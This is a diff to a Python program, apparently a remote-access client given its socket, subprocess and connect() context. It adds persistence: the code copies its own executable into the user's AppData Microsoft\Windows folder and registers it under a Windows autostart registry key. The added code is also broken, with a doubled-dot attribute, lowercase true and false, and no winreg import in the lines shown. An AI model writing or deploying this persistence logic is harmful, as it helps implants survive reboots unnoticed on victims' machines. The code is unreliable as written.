@@ -1,5 +1,6 @@
 import os
 import sys
+import shutil
 import socket
 import subprocess
 from time import sleep
@@ -27,7 +28,46 @@ REGISTRY_KEY_PATH = os.environ.get("REGISTRY_KEY_PATH", "Software\Microsoft\Wind
 
 
 def copy_to_system():
-    
+    try:
+        appdata_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows")
+        if not os.path.exists(appdata_path):
+            os.makedirs(appdata_path)
+        
+        current_file = sys.executable
+        destination = os.path.join(appdata_path, f'{PROGRAM_NAME}.exe')
+
+        if os.path.abspath(current_file) != os.path.abspath(destination):
+            shutil.copy2(current_file, destination)
+            return destination
+
+        return current_file
+
+    except Exception as e:
+        print(f'Error copying file: {e}')
+        return sys.executable
+
+def add_to_registry(file_path):
+    try:
+        key = winreg.OpenKey(
+            winreg.HKEY_CURRENT_USER,
+            REGISTRY_KEY_PATH,
+            0,
+            winreg..KEY_SET_VALUE
+        )
+
+        winreg.SetValueEx(
+            key,
+            PROGRAM_NAME,
+            0,
+            winreg.REG_SZ,
+            file_path
+        )
+
+        winreg.CloseKey(key)
+        return true 
+        
+    except Exception as e:
+        return false
 
 def connect():
     try:
